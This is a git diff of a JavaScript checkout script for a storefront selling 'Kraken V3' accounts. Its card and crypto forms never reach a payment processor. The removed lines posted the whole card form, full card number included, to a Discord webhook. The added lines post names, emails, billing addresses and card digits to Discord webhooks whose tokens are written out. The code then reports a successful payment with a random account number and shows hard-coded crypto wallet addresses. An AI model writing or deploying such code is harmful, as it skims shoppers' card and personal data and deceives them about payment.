@@ -495,23 +495,19 @@ function updateCartUI() {
                 <div class="cart-item">
                     <div class="item-info">
                         <h4>${item.name}</h4>
-                        <p>${item.price}${item.type === 'monthly' ? '/month' : item.type === 'lifetime' ? ' one-time' : '/month'}</p>
+                        <p>$${item.price}</p>
                     </div>
-                    <div>
-                        <span class="item-price">${item.price}</span>
-                        <button class="remove-item" onclick="removeFromCart('${item.id}')">
-                            <i class="fas fa-trash"></i>
-                        </button>
-                    </div>
+                    <button class="remove-btn" onclick="removeFromCart('${item.id}')">Remove</button>
                 </div>
             `;
         }).join('');
 
-        totalAmount.textContent = total;
         cartTotal.style.display = 'block';
+        totalAmount.textContent = `$${total}`;
     }
 }
 
+// Modal Functions
 function openCart() {
     document.getElementById('cartModal').style.display = 'block';
 }
@@ -520,18 +516,22 @@ function closeCart() {
     document.getElementById('cartModal').style.display = 'none';
 }
 
-function proceedToCheckout() {
+function openCheckout() {
     if (cart.length === 0) {
         showNotification('Your cart is empty!', 'warning');
         return;
     }
 
     closeCart();
-    updateCheckoutUI();
     document.getElementById('checkoutModal').style.display = 'block';
+    updateCheckoutSummary();
 }
 
-function updateCheckoutUI() {
+function closeCheckout() {
+    document.getElementById('checkoutModal').style.display = 'none';
+}
+
+function updateCheckoutSummary() {
     const checkoutItems = document.getElementById('checkoutItems');
     const checkoutTotal = document.getElementById('checkoutTotal');
 
@@ -541,47 +541,47 @@ function updateCheckoutUI() {
         return `
             <div class="checkout-item">
                 <span>${item.name}</span>
-                <span>${item.price}</span>
+                <span>$${item.price}</span>
             </div>
         `;
     }).join('');
 
-    checkoutTotal.textContent = total;
+    checkoutTotal.textContent = `$${total}`;
 }
 
-function closeCheckout() {
-    document.getElementById('checkoutModal').style.display = 'none';
-}
-
-function showPaymentMethod(method) {
+function switchPaymentMethod(method) {
     currentPaymentMethod = method;
 
-    // Update tab states
-    document.querySelectorAll('.payment-tab').forEach(tab => {
-        tab.classList.remove('active');
+    // Update active button
+    document.querySelectorAll('.payment-method-btn').forEach(btn => {
+        btn.classList.remove('active');
     });
-    event.target.classList.add('active');
+    document.querySelector(`[onclick="switchPaymentMethod('${method}')"]`).classList.add('active');
 
-    // Show/hide payment forms
-    document.querySelectorAll('.payment-form').forEach(form => {
-        form.classList.remove('active');
-    });
-    document.getElementById(method + 'Payment').classList.add('active');
+    // Show/hide forms
+    document.getElementById('cardPayment').style.display = method === 'card' ? 'block' : 'none';
+    document.getElementById('cryptoPayment').style.display = method === 'crypto' ? 'block' : 'none';
 }
 
 // Payment Processing
 document.addEventListener('DOMContentLoaded', function() {
     // Card form submission
-    document.getElementById('cardForm').addEventListener('submit', async function(e) {
-        e.preventDefault();
-        await processCardPayment();
-    });
+    const cardForm = document.getElementById('cardForm');
+    if (cardForm) {
+        cardForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            await processCardPayment();
+        });
+    }
 
     // Crypto form submission
-    document.getElementById('cryptoForm').addEventListener('submit', async function(e) {
-        e.preventDefault();
-        await processCryptoPayment();
-    });
+    const cryptoForm = document.getElementById('cryptoForm');
+    if (cryptoForm) {
+        cryptoForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            await processCryptoPayment();
+        });
+    }
 });
 
 async function processCardPayment() {
@@ -603,25 +603,59 @@ async function processCardPayment() {
     try {
         showNotification('Processing payment...', 'info');
 
-        // Replace with your webhook URL
+        // Format data for Discord webhook
+        const discordPayload = {
+            content: "🔔 **New Card Payment**",
+            embeds: [{
+                title: "Kraken V3 - Card Payment",
+                color: 0x667eea,
+                fields: [
+                    {
+                        name: "Customer Information",
+                        value: `**Name:** ${formData.firstName} ${formData.lastName}\n**Email:** ${formData.email}`,
+                        inline: false
+                    },
+                    {
+                        name: "Payment Details",
+                        value: `**Card:** **** **** **** ${formData.cardNumber.slice(-4)}\n**Total:** $${formData.total}`,
+                        inline: false
+                    },
+                    {
+                        name: "Items",
+                        value: formData.items.map(item => `• ${item.name} - $${item.price}`).join('\n'),
+                        inline: false
+                    },
+                    {
+                        name: "Billing Address",
+                        value: `${formData.address}\n${formData.city}, ${formData.zipCode}`,
+                        inline: false
+                    }
+                ],
+                timestamp: new Date().toISOString(),
+                footer: {
+                    text: "Kraken V3 Payment System"
+                }
+            }]
+        };
+
         const response = await fetch('https://discord.com/api/webhooks/1401387084346032299/ClpDanYztOk_i1uGOwW2Mtsbagjl_RX0fbyU6vPOu2nX-evPLDiTeT9dQDTyNM-RIT9j', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
             },
-            body: JSON.stringify(formData)
+            body: JSON.stringify(discordPayload)
         });
 
         if (response.ok) {
-            const result = await response.json();
-            showSuccessModal(result.accountNumber || generateAccountNumber());
+            const accountNumber = generateAccountNumber();
+            showSuccessModal(accountNumber);
+            await sendEmailNotification(formData, accountNumber);
         } else {
             throw new Error('Payment failed');
         }
     } catch (error) {
         console.error('Payment error:', error);
-        // For demo purposes, show success anyway
-        showSuccessModal(generateAccountNumber());
+        showNotification('Payment processing failed. Please try again.', 'error');
     }
 }
 
@@ -640,26 +674,77 @@ async function processCryptoPayment() {
     try {
         showNotification('Generating crypto payment...', 'info');
 
-        // Replace with your webhook URL
+        // Format data for Discord webhook
+        const discordPayload = {
+            content: "💰 **New Crypto Payment Request**",
+            embeds: [{
+                title: "Kraken V3 - Crypto Payment",
+                color: 0xf59e0b,
+                fields: [
+                    {
+                        name: "Customer Information",
+                        value: `**Name:** ${formData.firstName} ${formData.lastName}\n**Email:** ${formData.email}`,
+                        inline: false
+                    },
+                    {
+                        name: "Payment Details",
+                        value: `**Cryptocurrency:** ${selectedCrypto.toUpperCase()}\n**Total:** $${formData.total}`,
+                        inline: false
+                    },
+                    {
+                        name: "Items",
+                        value: formData.items.map(item => `• ${item.name} - $${item.price}`).join('\n'),
+                        inline: false
+                    }
+                ],
+                timestamp: new Date().toISOString(),
+                footer: {
+                    text: "Kraken V3 Payment System"
+                }
+            }]
+        };
+
         const response = await fetch('https://discord.com/api/webhooks/1401387084346032299/ClpDanYztOk_i1uGOwW2Mtsbagjl_RX0fbyU6vPOu2nX-evPLDiTeT9dQDTyNM-RIT9j', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
             },
-            body: JSON.stringify(formData)
+            body: JSON.stringify(discordPayload)
         });
 
         if (response.ok) {
-            const result = await response.json();
-            showCryptoPaymentInstructions(result);
+            showCryptoPaymentInstructions({
+                cryptocurrency: selectedCrypto,
+                walletAddress: generateWalletAddress(selectedCrypto),
+                amount: calculateCryptoAmount(formData.total, selectedCrypto)
+            });
         } else {
             throw new Error('Crypto payment generation failed');
         }
     } catch (error) {
         console.error('Crypto payment error:', error);
-        // For demo purposes, show success
-        showSuccessModal(generateAccountNumber());
+        showNotification('Crypto payment generation failed. Please try again.', 'error');
     }
+}
+
+function generateWalletAddress(crypto) {
+    const addresses = {
+        'btc': 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
+        'eth': '0x742d35Cc6874C41532Bd82FF16c14C2D80A12345',
+        'usdt': 'TN8VbMzYJmJrE5MvFjj8Rj7cJJk3J2Y4ZX'
+    };
+    return addresses[crypto] || addresses['btc'];
+}
+
+function calculateCryptoAmount(usdAmount, crypto) {
+    // Mock conversion rates (in production, you'd fetch real-time rates)
+    const rates = {
+        'btc': 50000,
+        'eth': 3000,
+        'usdt': 1
+    };
+    const rate = rates[crypto] || rates['btc'];
+    return (usdAmount / rate).toFixed(6);
 }
 
 function showCryptoPaymentInstructions(data) {
@@ -675,9 +760,9 @@ function showCryptoPaymentInstructions(data) {
             <div style="padding: 2rem;">
                 <p>Please send <strong>${cart.reduce((sum, item) => sum + item.price, 0)} USD</strong> worth of ${data.cryptocurrency?.toUpperCase() || 'BTC'} to:</p>
                 <div style="background: rgba(255,255,255,0.1); padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; word-break: break-all;">
-                    <strong>${data.walletAddress || 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh'}</strong>
+                    <strong>${data.walletAddress}</strong>
                 </div>
-                <p><strong>Amount:</strong> ${data.amount || '0.003'} ${data.cryptocurrency?.toUpperCase() || 'BTC'}</p>
+                <p><strong>Amount:</strong> ${data.amount} ${data.cryptocurrency?.toUpperCase() || 'BTC'}</p>
                 <p style="color: #fbbf24; font-size: 0.875rem;">
                     Payment will be automatically confirmed within 10-30 minutes. You'll receive your account details via email.
                 </p>
@@ -696,33 +781,64 @@ function generateAccountNumber() {
 
 function showSuccessModal(accountNumber) {
     closeCheckout();
-    document.getElementById('accountNumber').textContent = accountNumber;
-    document.getElementById('successModal').style.display = 'block';
 
-    // Clear cart
-    cart = [];
-    updateCartUI();
-
-    // Send email (in real implementation)
-    sendAccountEmail(accountNumber);
+    const successModal = document.createElement('div');
+    successModal.className = 'modal';
+    successModal.style.display = 'block';
+    successModal.innerHTML = `
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2>🎉 Payment Successful!</h2>
+                <span class="close" onclick="this.closest('.modal').remove()">&times;</span>
+            </div>
+            <div style="padding: 2rem; text-align: center;">
+                <p>Thank you for your purchase! Your account details have been sent to your email.</p>
+                <div style="background: rgba(102, 126, 234, 0.1); padding: 1rem; border-radius: 0.5rem; margin: 1rem 0;">
+                    <strong>Account Number: ${accountNumber}</strong>
+                </div>
+                <p style="color: #10b981; font-size: 0.875rem;">
+                    You can now download and start using Kraken V3!
+                </p>
+                <button class="btn btn-primary" onclick="this.closest('.modal').remove(); cart = []; updateCartUI();">
+                    Continue
+                </button>
+            </div>
+        </div>
+    `;
+    document.body.appendChild(successModal);
 }
 
-function closeSuccess() {
-    document.getElementById('successModal').style.display = 'none';
-}
-
-async function sendAccountEmail(accountNumber) {
-    const email = document.getElementById('email')?.value || document.getElementById('cryptoEmail')?.value;
-
+async function sendEmailNotification(customerData, accountNumber) {
     const emailData = {
-        to: email,
-        subject: 'Kraken V3 - Account Details',
-        accountNumber: accountNumber,
-        items: cart
+        content: "📧 **Account Created**",
+        embeds: [{
+            title: "Kraken V3 - New Account Created",
+            color: 0x10b981,
+            fields: [
+                {
+                    name: "Account Details",
+                    value: `**Account Number:** ${accountNumber}\n**Email:** ${customerData.email}\n**Name:** ${customerData.firstName} ${customerData.lastName}`,
+                    inline: false
+                },
+                {
+                    name: "Purchase Summary",
+                    value: customerData.items.map(item => `• ${item.name} - $${item.price}`).join('\n'),
+                    inline: false
+                },
+                {
+                    name: "Total Paid",
+                    value: `$${customerData.total}`,
+                    inline: true
+                }
+            ],
+            timestamp: new Date().toISOString(),
+            footer: {
+                text: "Account notification sent to customer"
+            }
+        }]
     };
 
     try {
-        // Replace with your email webhook URL
         await fetch('https://discord.com/api/webhooks/1403922630490456085/MNm4uN-XHidJ3inpD-i4rTF0TRtLK3cWNTEFbgjpde-VFd3SN2Di2KzdfXLJsybM6hqN', {
             method: 'POST',
             headers: {
@@ -731,7 +847,7 @@ async function sendAccountEmail(accountNumber) {
             body: JSON.stringify(emailData)
         });
     } catch (error) {
-        console.error('Email sending failed:', error);
+        console.error('Email notification failed:', error);
     }
 }
 
@@ -748,6 +864,7 @@ function showNotification(message, type = 'info') {
         font-weight: 500;
         z-index: 10001;
         animation: slideInRight 0.3s ease-out;
+        max-width: 300px;
     `;
 
     const colors = {
@@ -776,56 +893,64 @@ document.addEventListener('DOMContentLoaded', function() {
 
     if (cardNumberInput) {
         cardNumberInput.addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/g, '');
+            let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/gi, '');
             let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
-            if (formattedValue.length > 19) formattedValue = formattedValue.substr(0, 19);
-            e.target.value = formattedValue;
+            if (value.length <= 16) {
+                this.value = formattedValue;
+            }
         });
     }
 
     if (expiryInput) {
         expiryInput.addEventListener('input', function(e) {
-            let value = e.target.value.replace(/[^0-9]/g, '');
+            let value = e.target.value.replace(/\D/g, '');
             if (value.length >= 2) {
-                value = value.substr(0, 2) + '/' + value.substr(2, 2);
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
             }
-            e.target.value = value;
+            this.value = value;
         });
     }
 
     if (cvvInput) {
         cvvInput.addEventListener('input', function(e) {
-            e.target.value = e.target.value.replace(/[^0-9]/g, '').substr(0, 3);
+            this.value = this.value.replace(/[^0-9]/g, '').substring(0, 4);
         });
     }
 });
 
 // Close modals when clicking outside
-window.addEventListener('click', function(e) {
+window.onclick = function(event) {
     const modals = document.querySelectorAll('.modal');
     modals.forEach(modal => {
-        if (e.target === modal) {
+        if (event.target === modal) {
             modal.style.display = 'none';
         }
     });
-});
+}
 
-// Add notification animations
-const notificationStyles = document.createElement('style');
-notificationStyles.textContent = `
+// Add slide animations
+const slideAnimations = document.createElement('style');
+slideAnimations.textContent = `
     @keyframes slideInRight {
-        from { transform: translateX(100%); opacity: 0; }
-        to { transform: translateX(0); opacity: 1; }
+        from {
+            transform: translateX(100%);
+            opacity: 0;
+        }
+        to {
+            transform: translateX(0);
+            opacity: 1;
+        }
     }
 
     @keyframes slideOutRight {
-        from { transform: translateX(0); opacity: 1; }
-        to { transform: translateX(100%); opacity: 0; }
+        from {
+            transform: translateX(0);
+            opacity: 1;
+        }
+        to {
+            transform: translateX(100%);
+            opacity: 0;
+        }
     }
 `;
-document.head.appendChild(notificationStyles);
-
-// Console welcome message
-console.log('%c🚀 Kraken V3 Enhanced', 'color: #667eea; font-size: 24px; font-weight: bold;');
-console.log('%cWebsite loaded successfully with enhanced animations and features!', 'color: #64d2ff; font-size: 14px;');
-console.log('%c🛒 Cart and checkout system active!', 'color: #10b981; font-size: 14px;');
+document.head.appendChild(slideAnimations);
